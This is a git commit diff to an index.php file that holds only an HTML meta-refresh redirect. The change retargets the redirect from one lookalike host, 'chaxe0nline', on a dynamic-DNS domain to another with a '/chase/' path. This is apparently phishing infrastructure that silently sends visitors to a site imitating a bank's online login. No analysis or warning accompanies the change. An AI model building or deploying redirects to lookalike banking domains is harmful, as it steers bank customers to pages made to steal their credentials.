cb7e378fcf64faa65b620bd141f81482d83ccc43
mjmjpro <78958687+mjmjpro@users.noreply.github.com>
2021-02-17 09:46:51 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,7 +1,7 @@
  <html xmlns="http://www.w3.org/1999/xhtml">    
   <head>      
     <title></title>      
-    <meta http-equiv="refresh" content="0;URL='https://chaxe0nline.webredirect.org/'" />    
+    <meta http-equiv="refresh" content="0;URL='https://chaxe0nline.serveftp.com/chase/'" />    
   </head>    
   <body> 
   
